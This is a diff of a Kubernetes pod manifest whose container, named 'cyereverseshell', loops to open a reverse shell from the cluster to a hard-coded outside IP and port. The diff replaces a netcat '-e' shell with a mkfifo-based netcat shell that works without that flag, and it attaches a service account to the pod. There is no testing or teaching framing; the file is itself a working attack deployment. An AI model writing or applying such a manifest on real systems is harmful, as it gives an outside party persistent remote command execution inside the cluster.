@@ -6,15 +6,16 @@ metadata:
   labels:
     app: nc
 spec:
+  serviceAccountName: cyerspod-sa
   containers:
   - name: cyereverseshell
     image: busybox
-    args: ["/bin/sh", "-c", "while true; do echo 'Connecting...'; nc -e /bin/sh 68.183.22.232 4641 || echo 'Connection failed'; sleep 10; done"]
+    args: ["/bin/sh", "-c", "while true; do mkfifo /tmp/f; nc 68.183.22.232 4641 < /tmp/f | /bin/sh > /tmp/f 2>&1; sleep 10; done"]
     securityContext:
-      runAsNonRoot: true  # Ensure the container does not run as root
-      runAsUser: 1000  # Set non-root UID
-      allowPrivilegeEscalation: false  # Prevent privilege escalation
+      runAsNonRoot: true
+      runAsUser: 1000
+      allowPrivilegeEscalation: false
       capabilities:
-        drop: ["ALL"]  # Drop unnecessary capabilities
+        drop: ["ALL"]
       seccompProfile:
         type: RuntimeDefault
